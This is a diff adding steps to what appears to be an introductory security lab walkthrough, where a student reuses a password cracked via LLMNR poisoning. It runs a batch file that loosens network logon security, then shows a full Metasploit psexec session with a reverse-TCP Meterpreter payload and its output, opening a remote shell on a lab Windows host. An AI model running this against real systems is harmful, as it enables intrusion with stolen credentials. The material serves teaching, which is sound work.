@@ -56,4 +56,55 @@ Remember!  Your IP will be different!!!!
 
 You should see the Windows password be cracked very quickly.  
 
+Now, let’s use that password!
+
+First, we will need to run a script that configures your system as though it is on a domain with little to no security between workstations.
+Basically, it allows logons over the network.
+
+Use file explorer to navigate to C:\IntroLabs
+
+Then, Right-click on the smb.bat file and run it as Administrator:
+
+![](attachments/SMB_bat.jpg)
+
+Next, let’s open a new Ubuntu Command Prompt.
+
+![](attachments/Clipboard_2020-06-17-08-32-51.png)
+
+Now we are going to start up and launch Metasploit against the Windows system to get a Meterpreter session.
+
+<pre>
+adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ sudo su -
+[sudo] password for adhd:
+root@DESKTOP-I1T2G01:~#
+root@DESKTOP-I1T2G01:~# msfconsole -q
+This copy of metasploit-framework is more than two weeks old.
+ Consider running 'msfupdate' to update to the latest version.
+msf5 > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) >
+msf5 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/psexec) >
+msf5 exploit(windows/smb/psexec) > set RHOSTS 172.18.112.1
+RHOSTS => 172.18.112.1
+msf5 exploit(windows/smb/psexec) > set SMBUSER adhd
+SMBUSER => adhd
+msf5 exploit(windows/smb/psexec) > set SMBPASS adhd
+SMBPASS => adhd
+msf5 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 172.18.121.248:4444
+[*] 172.18.112.1:445 - Connecting to the server...
+[*] 172.18.112.1:445 - Authenticating to 172.18.112.1:445 as user 'adhd'...
+[*] 172.18.112.1:445 - Selecting PowerShell target
+[*] 172.18.112.1:445 - Executing the payload...
+[+] 172.18.112.1:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (176195 bytes) to 172.18.112.1
+[*] Meterpreter session 1 opened (172.18.121.248:4444 -> 172.18.112.1:52806) at 2022-10-18 12:39:56 -0600
+
+meterpreter >
+</pre>
+Now, you can see just how bad LLMNR is!!!!
+
+
 
